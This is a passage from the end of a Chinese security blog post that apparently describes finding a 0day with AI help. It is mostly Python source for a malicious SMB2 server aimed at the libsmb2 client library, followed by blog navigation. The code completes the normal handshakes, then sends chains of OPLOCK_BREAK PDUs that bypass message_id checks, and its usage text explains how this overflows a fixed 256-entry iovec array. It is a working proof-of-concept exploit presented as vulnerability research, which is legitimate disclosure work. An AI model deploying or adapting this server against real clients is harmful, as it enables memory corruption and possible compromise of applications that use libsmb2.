NetBIOS长度: <span class="subst">&#123;nb_length&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 解析SMB2头部</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(initial_data) &gt;= <span class="number">68</span>:  <span class="comment"># NetBIOS(4) + SMB2头部(64)</span></span><br><span class="line">                        smb2_data = initial_data[<span class="number">4</span>:]</span><br><span class="line">                        <span class="keyword">if</span> smb2_data[:<span class="number">4</span>] == <span class="string">b&#x27;\xFE\x53\x4D\x42&#x27;</span>:</span><br><span class="line">                            smb2_command = struct.unpack(<span class="string">&#x27;&lt;H&#x27;</span>, smb2_data[<span class="number">12</span>:<span class="number">14</span>])[<span class="number">0</span>]</span><br><span class="line">                            message_id = struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, smb2_data[<span class="number">24</span>:<span class="number">32</span>])[<span class="number">0</span>]</span><br><span class="line">                            logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] SMB2命令: 0x<span class="subst">&#123;smb2_command:04X&#125;</span> (<span class="subst">&#123;self.get_command_name(smb2_command)&#125;</span>), MessageID: <span class="subst">&#123;message_id&#125;</span>&quot;</span>)</span><br><span class="line">                            </span><br><span class="line">                            <span class="comment"># 根据命令类型决定响应策略</span></span><br><span class="line">                            <span class="keyword">if</span> smb2_command <span class="keyword">in</span> [<span class="number">0x0000</span>, <span class="number">0x0001</span>, <span class="number">0x0003</span>]:  <span class="comment"># NEGOTIATE, SESSION_SETUP, TREE_CONNECT</span></span><br><span class="line">                                <span class="comment"># 这些基础握手命令始终返回单个正常响应（非链式）</span></span><br><span class="line">                                logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 基础握手阶段：<span class="subst">&#123;self.get_command_name(smb2_command)&#125;</span>，发送单个正常响应&quot;</span>)</span><br><span class="line">                                response_data = self.create_normal_smb2_response(command=smb2_command, message_id=message_id)</span><br><span class="line">                                logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] ✅ 发送单个<span class="subst">&#123;self.get_command_name(smb2_command)&#125;</span>响应（非链式）&quot;</span>)</span><br><span class="line">                                </span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="comment"># 其他SMB命令使用链式处理</span></span><br><span class="line">                                logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 为<span class="subst">&#123;self.get_command_name(smb2_command)&#125;</span>生成链式响应&quot;</span>)</span><br><span class="line">                                chain_data = self.create_chain_pdu_sequence(base_command=smb2_command, pdu_count=self.chain_count, original_message_id=message_id)</span><br><span class="line">                                netbios_header = struct.pack(<span class="string">&#x27;&gt;L&#x27;</span>, <span class="built_in">len</span>(chain_data))</span><br><span class="line">                                response_data = netbios_header + chain_data</span><br><span class="line">                                logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] ✅ 发送混合攻击链式<span class="subst">&#123;self.get_command_name(smb2_command)&#125;</span>响应（1个正常PDU + <span class="subst">&#123;self.chain_count-<span class="number">1</span>&#125;</span>个OPLOCK_BREAK PDU）&quot;</span>)</span><br><span class="line">                                </span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            logger.warning(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 非SMB2协议数据&quot;</span>)</span><br><span class="line">                            logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 协议标识: <span class="subst">&#123;hexlify(smb2_data[:<span class="number">4</span>])&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 发送响应</span></span><br><span class="line">                <span class="keyword">if</span> response_data:</span><br><span class="line">                    logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 响应大小: <span class="subst">&#123;<span class="built_in">len</span>(response_data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">                    logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 响应前64字节: <span class="subst">&#123;hexlify(response_data[:<span class="number">64</span>])&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 分块发送</span></span><br><span class="line">                    chunk_size = <span class="number">4096</span></span><br><span class="line">                    total_sent = <span class="number">0</span></span><br><span class="line">                    send_start_time = time.time()</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">while</span> total_sent &lt; <span class="built_in">len</span>(response_data):</span><br><span class="line">                        chunk_end = <span class="built_in">min</span>(total_sent + chunk_size, <span class="built_in">len</span>(response_data))</span><br><span class="line">                        chunk = response_data[total_sent:chunk_end]</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            sent = client_socket.send(chunk)</span><br><span class="line">                            <span class="keyword">if</span> sent == <span class="number">0</span>:</span><br><span class="line">                                logger.error(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 发送失败，连接可能已断开&quot;</span>)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                                </span><br><span class="line">                            total_sent += sent</span><br><span class="line">                            logger.debug(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 发送进度: <span class="subst">&#123;total_sent&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(response_data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">                            </span><br><span class="line">                        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">                            logger.error(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 发送数据时出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                            </span><br><span class="line">                        <span class="comment"># 添加小延时</span></span><br><span class="line">                        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">                    </span><br><span class="line">                    send_duration = time.time() - send_start_time</span><br><span class="line">                    logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 总共发送: <span class="subst">&#123;total_sent&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(response_data)&#125;</span> 字节，耗时: <span class="subst">&#123;send_duration:<span class="number">.3</span>f&#125;</span>秒&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    logger.warning(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 未生成响应数据&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 等待观察客户端反应</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> response:</span><br><span class="line">                    logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 收到后续数据: <span class="subst">&#123;<span class="built_in">len</span>(response)&#125;</span> 字节&quot;</span>)</span><br><span class="line">                    logger.debug(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 后续数据: <span class="subst">&#123;hexlify(response[:<span class="number">64</span>])&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 读取后续数据异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">            logger.warning(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 连接被对方重置&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> BrokenPipeError:</span><br><span class="line">            logger.warning(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 管道断开 - 客户端已断开连接&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(e, <span class="string">&#x27;errno&#x27;</span>) <span class="keyword">and</span> e.errno == <span class="number">104</span>:  <span class="comment"># Connection reset by peer</span></span><br><span class="line">                logger.warning(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 连接被重置&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logger.error(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 网络异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.error(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 处理异常: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">import</span> traceback</span><br><span class="line">            logger.debug(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 异常详情:\n<span class="subst">&#123;traceback.format_exc()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                client_socket.close()</span><br><span class="line">                logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 连接已关闭&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_server</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;启动SMB2测试服务器&quot;&quot;&quot;</span></span><br><span class="line">        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server_socket.bind((self.host, self.port))</span><br><span class="line">            server_socket.listen(<span class="number">10</span>)</span><br><span class="line">            </span><br><span class="line">            logger.info(<span class="string">f&quot;🚀 SMB2测试服务器已启动&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;🚀 监听地址: <span class="subst">&#123;self.host&#125;</span>:<span class="subst">&#123;self.port&#125;</span>&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;🚀 处理策略:&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;   📋 基础握手阶段 (NEGOTIATE/SESSION_SETUP/TREE_CONNECT): 发送单个正常响应&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;   🚨 其他SMB命令: 发送混合攻击链式PDU (<span class="subst">&#123;self.chain_count&#125;</span> 个)&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;   💥 攻击机制: 第1个PDU通过验证，后续OPLOCK_BREAK PDU绕过message_id检查&quot;</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;🚀 等待 SMB2 客户端连接...&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    client_socket, client_addr = server_socket.accept()</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 为每个客户端创建处理线程</span></span><br><span class="line">                    client_thread = threading.Thread(</span><br><span class="line">                        target=self.handle_client_connection,</span><br><span class="line">                        args=(client_socket, client_addr),</span><br><span class="line">                        daemon=<span class="literal">True</span></span><br><span class="line">                    )</span><br><span class="line">                    client_thread.start()</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                    logger.info(<span class="string">&quot;收到中断信号，正在关闭服务器...&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    logger.error(<span class="string">f&quot;接受连接时出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">except</span> PermissionError:</span><br><span class="line">            logger.error(<span class="string">f&quot;权限不足，无法绑定端口 <span class="subst">&#123;self.port&#125;</span>&quot;</span>)</span><br><span class="line">            logger.error(<span class="string">&quot;请使用 sudo 运行，或者使用非特权端口 (&gt;1024)&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.error(<span class="string">f&quot;服务器启动失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            server_socket.close()</span><br><span class="line">            logger.info(<span class="string">&quot;SMB2测试服务器已关闭&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;SMB2 链式 PDU 测试服务器&#x27;</span>,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用示例:</span></span><br><span class="line"><span class="string">  sudo python3 smb_hack.py                          # 默认配置 (100个链式PDU)</span></span><br><span class="line"><span class="string">  python3 smb_hack.py -p 8445 --chain-count 200     # 非特权端口 + 200个链式PDU</span></span><br><span class="line"><span class="string">  python3 smb_hack.py -d --chain-count 50           # 调试模式 + 50个链式PDU</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">攻击策略:</span></span><br><span class="line"><span class="string">  • 基础握手阶段 (NEGOTIATE/SESSION_SETUP/TREE_CONNECT): </span></span><br><span class="line"><span class="string">    - 始终发送单个正常响应，确保连接建立成功</span></span><br><span class="line"><span class="string">  • 其他SMB命令 (CREATE/READ/WRITE/QUERY等):</span></span><br><span class="line"><span class="string">    - 第1个PDU: 使用正常命令和匹配的message_id，通过验证</span></span><br><span class="line"><span class="string">    - 后续PDU: 使用OPLOCK_BREAK命令，绕过message_id检查</span></span><br><span class="line"><span class="string">    - 目标: 触发大量smb2_add_iovector调用，导致缓冲区溢出</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">缓冲区溢出机制:</span></span><br><span class="line"><span class="string">  • libsmb2中smb2_io_vectors结构固定256个iovec数组</span></span><br><span class="line"><span class="string">  • smb2_add_iovector函数缺乏边界检查</span></span><br><span class="line"><span class="string">  • 每个PDU处理会调用4-5次smb2_add_iovector</span></span><br><span class="line"><span class="string">  • 200个PDU约触发1000+次调用，远超256限制</span></span><br><span class="line"><span class="string">  • OPLOCK_BREAK绕过message_id匹配，实现大规模链式攻击</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-H&#x27;</span>, <span class="string">&#x27;--host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;监听地址 (默认: 0.0.0.0)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">445</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;监听端口 (默认: 445)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--debug&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;启用调试模式，输出详细信息&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--chain-count&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">100</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;链式PDU的数量 (默认: 100, 范围: 1-300) - 大量PDU用于触发缓冲区溢出&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证链式PDU数量范围</span></span><br><span class="line">    <span class="keyword">if</span> args.chain_count &lt; <span class="number">1</span> <span class="keyword">or</span> args.chain_count &gt; <span class="number">300</span>:</span><br><span class="line">        logger.error(<span class="string">&quot;链式PDU数量必须在1-300之间&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 权限检查</span></span><br><span class="line">    <span class="keyword">if</span> args.port &lt; <span class="number">1024</span> <span class="keyword">and</span> os.geteuid() != <span class="number">0</span>:</span><br><span class="line">        logger.error(<span class="string">f&quot;使用特权端口 <span class="subst">&#123;args.port&#125;</span> 需要 root 权限&quot;</span>)</span><br><span class="line">        logger.error(<span class="string">&quot;请使用 sudo 运行，或选择端口 &gt;= 1024&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建并启动测试服务器</span></span><br><span class="line">    test_server = ArchSMB2TestServer(</span><br><span class="line">        host=args.host, </span><br><span class="line">        port=args.port, </span><br><span class="line">        debug_mode=args.debug</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置链式PDU数量</span></span><br><span class="line">    test_server.chain_count = args.chain_count</span><br><span class="line">    </span><br><span class="line">    logger.info(<span class="string">f&quot;🚨 混合攻击链式PDU数量: <span class="subst">&#123;args.chain_count&#125;</span>&quot;</span>)</span><br><span class="line">    logger.info(<span class="string">f&quot;💥 攻击策略: 第1个PDU通过message_id验证，后续<span class="subst">&#123;args.chain_count-<span class="number">1</span>&#125;</span>个OPLOCK_BREAK PDU绕过验证&quot;</span>)</span><br><span class="line">    logger.info(<span class="string">f&quot;🎯 目标: 触发约<span class="subst">&#123;args.chain_count * <span class="number">4</span>&#125;</span>次smb2_add_iovector调用，超过256限制引发缓冲区溢出&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        test_server.start_server()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        logger.info(<span class="string">&quot;用户中断，程序退出&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/08/07/Ret2HarmonyOS-Frida%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E5%85%A5%E9%97%A8/" title="Ret2HarmonyOS: Frida环境搭建和入门">
+                    <div class="prevTitle">Ret2HarmonyOS: Frida环境搭建和入门</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            <!-- partial('_partial/comment/custom') -->
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:zj_w1nd@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/ZjW1nd" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://steamcommunity.com/id/ZJwind/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span> readers</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">纯粹AI的poc：</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 74
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span>
+            <a class="archive-post-title" href="/2025/08/26/Vibe-SecurityReserch-%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%94%A8ai%E5%8F%91%E7%8E%B00day%E5%B9%B6%E6%92%B0%E5%86%99poc%E7%9A%84/">Vibe SecurityReserch: 我是如何用ai发现0day并撰写poc的</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span>
